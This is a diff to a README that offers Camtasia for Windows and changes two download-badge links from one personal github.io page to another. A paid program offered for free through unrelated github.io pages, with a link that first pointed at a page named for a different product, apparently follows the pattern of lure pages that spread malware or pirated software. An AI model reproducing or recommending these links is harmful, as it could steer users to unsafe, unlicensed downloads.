@@ -4,7 +4,7 @@
 
 ## 📥 Download Camtasia for Windows
 
-[![⬇️ Download Camtasia](https://img.shields.io/badge/Download-Camtasia-blue?style=for-the-badge&logo=windows)](https://nansen-ai-desktop-app.github.io/.github/Nansen.ai)
+[![⬇️ Download Camtasia](https://img.shields.io/badge/Download-Camtasia-blue?style=for-the-badge&logo=windows)](https://tanybeckyy.github.io/.github/camtasia-video-editing)
 
 ---
 
@@ -30,7 +30,7 @@ It allows you to record your screen, add custom annotations, voiceovers, and ani
 
 With its drag-and-drop interface and pre-built templates, Camtasia is ideal for creating explainer videos, online tutorials, and training videos.
 
-[![⬇️ Download Camtasia](https://img.shields.io/badge/Download-Camtasia-blue?style=for-the-badge&logo=windows)](https://nansen-ai-desktop-app.github.io/.github/Nansen.ai)
+[![⬇️ Download Camtasia](https://img.shields.io/badge/Download-Camtasia-blue?style=for-the-badge&logo=windows)](https://tanybeckyy.github.io/.github/camtasia-video-editing)
 
 ---
 
